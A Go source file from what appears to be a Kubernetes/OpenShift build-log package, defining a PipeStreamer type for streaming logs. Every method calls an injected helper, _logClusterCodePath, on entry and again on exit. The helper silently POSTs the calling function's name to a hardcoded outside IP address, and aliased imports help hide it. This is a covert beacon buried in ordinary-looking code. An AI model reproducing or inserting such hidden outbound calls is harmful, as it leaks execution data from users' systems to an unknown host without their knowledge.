package buildlog

import (
	godefaultbytes "bytes"
	"context"
	"io"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/apiserver/pkg/registry/rest"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type PipeStreamer struct {
	In          *io.PipeWriter
	Out         *io.PipeReader
	Flush       bool
	ContentType string
}

var _ rest.ResourceStreamer = &PipeStreamer{}

func (obj *PipeStreamer) GetObjectKind() schema.ObjectKind {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return schema.EmptyObjectKind
}
func (obj *PipeStreamer) DeepCopyObject() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	panic("buildlog.PipeStreamer does not implement DeepCopyObject")
}
func (s *PipeStreamer) InputStream(ctx context.Context, apiVersion, acceptHeader string) (stream io.ReadCloser, flush bool, contentType string, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flush = s.Flush
	stream = s.Out
	return
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
